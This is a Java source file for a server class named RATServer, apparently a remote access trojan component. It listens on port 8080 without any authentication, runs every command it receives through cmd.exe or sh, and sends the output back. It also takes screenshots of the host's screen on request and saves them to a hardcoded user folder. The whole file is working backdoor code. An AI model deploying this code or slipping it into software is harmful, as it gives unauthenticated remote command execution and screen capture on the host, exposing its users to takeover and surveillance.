import java.awt.*;
import java.awt.image.BufferedImage;
import javax.imageio.ImageIO;
import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.Date;

public class RATServer {
    public static void main(String[] args) {
        System.out.println("[Server] Starting...");
        try (ServerSocket serverSocket = new ServerSocket(8080)) {
            System.out.println("[Server] Started. Waiting for connection...");

            while (true) {
                try (Socket clientSocket = serverSocket.accept();
                     BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
                     PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true)) {

                    System.out.println("[Server] Client connected at: '" + clientSocket.getInetAddress().getHostAddress() + "'");

                    String command;
                    while ((command = in.readLine()) != null) {
                        command = command.trim();
                        System.out.println("\n[Server] Received command: " + command);

                        try {
                            if ("TAKE_SCREENSHOT".equals(command)) {
                                takeScreenshot(out);
                            } else {
                                System.out.println("[Server] Started executing command: " + command);
                                String output = executeCommand(command);
                                System.out.println("[Server] Command output: \n" + output);
                                out.println(output);
                                out.println("END_OF_RESPONSE"); // Marker for end of response
                                System.out.println("[Server] Stopped executing command: " + command);
                                System.out.println("[Server] Successfully sent output to client.");
                            }
                        } catch (AWTException e) {
                            System.err.println("[Server] AWT error: " + e.getMessage());
                        } catch (IOException e) {
                            System.err.println("[Server] IO error: " + e.getMessage());
                        } catch (Exception e) {
                            System.err.println("[Server] General error: " + e.getMessage());
                        }

                        out.flush();
                        System.out.println("[Server] Execution successful, waiting for new input...");
                    }

                    System.out.println("[Server] Client disconnected.");
                } catch (IOException e) {
                    System.err.println("[Server] Client disconnected or error occurred: " + e.getMessage());
                    System.out.println("[Server] Waiting for new connection...");
                }
            }
        } catch (IOException e) {
            System.err.println("[Server] Server Error: " + e.getMessage());
            e.printStackTrace();
        }
    }

    private static void takeScreenshot(PrintWriter out) throws AWTException, IOException {
        Robot robot = new Robot();
        Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage screenFullImage = robot.createScreenCapture(screenRect);
        String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
        File outputFile = new File("C:\\Users\\Victor\\Pictures\\screenshot_" + timestamp + ".jpg");
        ImageIO.write(screenFullImage, "jpg", outputFile);
        out.println("Screenshot taken and saved as " + outputFile.getName());
        out.println("END_OF_RESPONSE");
        System.out.println("[Server] Screenshot taken: " + outputFile.getName());
    }

    private static String executeCommand(String command) {
        StringBuilder output = new StringBuilder();
        try {
            ProcessBuilder builder = new ProcessBuilder();
            if (System.getProperty("os.name").toLowerCase().startsWith("windows")) {
                builder.command("cmd.exe", "/c", command);
            } else {
                builder.command("sh", "-c", command);
            }
            builder.redirectErrorStream(true);
            Process process = builder.start();

            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }

            int exitVal = process.waitFor();
            System.out.println("[Server] Command '" + command + "' executed with exit value: " + exitVal);
        } catch (Exception e) {
            output.append("Error executing command: ").append(e.getMessage());
            System.err.println("[Server] Error executing command '" + command + "': " + e.getMessage());
        }
        return output.toString();
    }
}
